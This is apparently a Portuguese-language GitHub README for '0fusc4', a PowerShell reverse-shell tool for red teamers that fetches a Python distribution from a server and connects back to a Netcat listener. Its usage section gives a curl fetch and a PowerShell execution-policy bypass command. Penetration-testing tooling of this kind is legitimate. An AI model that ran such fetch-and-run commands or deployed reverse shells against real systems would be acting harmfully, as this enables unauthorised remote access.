# 0fusc4
0fusc4 é uma ferramenta desenvolvida para profissionais de Red Team e pentesters. Ela é um shell reverso, ou seja, permite estabelecer uma conexão remota entre dois sistemas, onde um atua como o servidor e o outro como o cliente. Essa ferramenta é implementada em PowerShell e utiliza um script Python para executar o shell reverso.

A funcionalidade principal do 0fusc4 envolve o estabelecimento de uma conexão com um servidor web onde está hospedado um arquivo ZIP contendo uma distribuição Python. Ao se conectar a esse servidor, o 0fusc4 realiza o download do arquivo ZIP e descompacta-o em um diretório temporário, carregando-o em memória.

Após a extração, o 0fusc4 executa o shell reverso por meio do script Python contido no powershell. Para que a comunicação seja possível, é necessário que um programa como o Netcat esteja ouvindo na máquina receptora para receber o shell reverso.

Durante a execução do shell reverso, o 0fusc4 aguarda comandos enviados pelo sistema receptor. Caso o comando recebido seja "exit", o 0fusc4 encerra a conexão com o servidor remoto e exclui os arquivos temporários baixados, mantendo apenas o script criado.

Dessa forma, o 0fusc4 possibilita a execução de um shell reverso por meio de um script Python, utilizando uma distribuição Python em memória. Essa ferramenta é útil para atividades de teste de penetração e avaliação de segurança, permitindo o acesso remoto a sistemas para realizar ações específicas, conforme necessário.

Use:

- curl -O "http://example.com/0fusc4.ps1"

- powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"

![image](https://github.com/carlosalbertotuma/0fusc4/assets/13341724/eff83c3f-3887-45a1-8536-d567aa26d52d)

